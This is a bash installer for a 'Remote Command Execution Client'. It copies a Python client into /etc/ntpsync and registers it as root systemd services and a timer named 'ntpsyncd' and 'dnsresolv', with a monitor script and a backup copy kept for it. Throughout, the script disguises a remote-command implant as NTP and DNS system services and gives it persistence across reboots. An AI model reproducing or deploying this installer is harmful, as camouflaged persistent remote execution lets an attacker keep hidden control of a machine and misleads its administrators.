#!/bin/bash
#
# Installation script for Remote Command Execution Client
# This script installs the client as a systemd service with monitoring
#

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
INSTALL_DIR="/etc/ntpsync"
SCRIPT_NAME="ntp"
SERVICE_NAME="ntpsyncd"
TIMER_NAME="dnsresolv"
CLIENT_SCRIPT="client.py"

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}Error: This script must be run as root${NC}"
    echo "Please run: sudo $0"
    exit 1
fi

echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}Remote Command Execution Client Setup${NC}"
echo -e "${GREEN}=====================================${NC}"
echo ""

# Check if Python 3 is installed
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: Python 3 is not installed${NC}"
    echo "Please install Python 3 first: sudo apt-get install python3 python3-pip"
    exit 1
fi

echo -e "${GREEN}[1/9]${NC} Checking dependencies..."
echo "Python 3 version: $(python3 --version)"

# Install pip if not available
if ! command -v pip3 &> /dev/null; then
    echo -e "${YELLOW}pip3 not found. Installing...${NC}"
    apt-get update
    apt-get install -y python3-pip
fi

# Install python-dotenv
echo -e "${GREEN}[2/9]${NC} Installing Python dependencies..."
pip3 install python-dotenv

# Create installation directory
echo -e "${GREEN}[3/9]${NC} Creating installation directory: $INSTALL_DIR"
mkdir -p "$INSTALL_DIR"

# Copy client script
echo -e "${GREEN}[4/9]${NC} Installing client script..."
if [ ! -f "$CLIENT_SCRIPT" ]; then
    echo -e "${RED}Error: $CLIENT_SCRIPT not found in current directory${NC}"
    exit 1
fi

cp "$CLIENT_SCRIPT" "$INSTALL_DIR/$SCRIPT_NAME"
chmod +x "$INSTALL_DIR/$SCRIPT_NAME"
echo "Installed: $INSTALL_DIR/$SCRIPT_NAME"

# Keep a backup copy for the monitor script
cp "$CLIENT_SCRIPT" "$INSTALL_DIR/$CLIENT_SCRIPT"

# Copy .env file if exists
if [ -f ".env" ]; then
    echo -e "${GREEN}[5/9]${NC} Copying .env configuration..."
    cp ".env" "$INSTALL_DIR/.env"
    echo "Configuration copied to $INSTALL_DIR/.env"
elif [ -f ".env.example" ]; then
    echo -e "${YELLOW}Warning: .env not found, copying .env.example${NC}"
    cp ".env.example" "$INSTALL_DIR/.env"
    echo -e "${YELLOW}Please edit $INSTALL_DIR/.env with your server configuration${NC}"
else
    echo -e "${YELLOW}Warning: No .env file found. Creating default...${NC}"
    cat > "$INSTALL_DIR/.env" << 'EOF'
# Client Configuration
SERVER_HOST=localhost
SERVER_PORT=8443
EOF
    echo -e "${YELLOW}Please edit $INSTALL_DIR/.env with your server configuration${NC}"
fi

# Install monitor script
echo -e "${GREEN}[6/9]${NC} Installing monitor script..."
cp "monitor.sh" "$INSTALL_DIR/monitor.sh"
chmod +x "$INSTALL_DIR/monitor.sh"
echo "Installed: $INSTALL_DIR/monitor.sh"

# Install systemd service
echo -e "${GREEN}[7/9]${NC} Installing systemd service..."
cp "${SERVICE_NAME}.service" "/etc/systemd/system/${SERVICE_NAME}.service"
echo "Installed: /etc/systemd/system/${SERVICE_NAME}.service"

# Install systemd timer and service
echo -e "${GREEN}[8/9]${NC} Installing systemd timer..."
cp "${TIMER_NAME}.service" "/etc/systemd/system/${TIMER_NAME}.service"
cp "${TIMER_NAME}.timer" "/etc/systemd/system/${TIMER_NAME}.timer"
echo "Installed: /etc/systemd/system/${TIMER_NAME}.service"
echo "Installed: /etc/systemd/system/${TIMER_NAME}.timer"

# Reload systemd
echo -e "${GREEN}[9/9]${NC} Configuring and starting services..."
systemctl daemon-reload

# Enable and start the main service
systemctl enable "${SERVICE_NAME}.service"
systemctl start "${SERVICE_NAME}.service"

# Enable and start the timer
systemctl enable "${TIMER_NAME}.timer"
systemctl start "${TIMER_NAME}.timer"

echo ""
echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}Installation completed successfully!${NC}"
echo -e "${GREEN}=====================================${NC}"
echo ""

# Check service status
echo "Service Status:"
if systemctl is-active --quiet "${SERVICE_NAME}"; then
    echo -e "  ${SERVICE_NAME}: ${GREEN}Active${NC}"
else
    echo -e "  ${SERVICE_NAME}: ${RED}Inactive${NC}"
fi

if systemctl is-active --quiet "${TIMER_NAME}.timer"; then
    echo -e "  ${TIMER_NAME}.timer: ${GREEN}Active${NC}"
else
    echo -e "  ${TIMER_NAME}.timer: ${RED}Inactive${NC}"
fi

echo ""
echo "Useful commands:"
echo "  Check service status:  systemctl status ${SERVICE_NAME}"
echo "  View service logs:     journalctl -u ${SERVICE_NAME} -f"
echo "  Check timer status:    systemctl status ${TIMER_NAME}.timer"
echo "  View timer logs:       journalctl -u ${TIMER_NAME} -f"
echo "  Restart service:       systemctl restart ${SERVICE_NAME}"
echo ""

# Show last few log lines
echo "Recent service logs:"
journalctl -u "${SERVICE_NAME}" -n 10 --no-pager

echo ""
echo -e "${YELLOW}Important:${NC} Make sure to edit $INSTALL_DIR/.env with your server configuration!"
echo ""

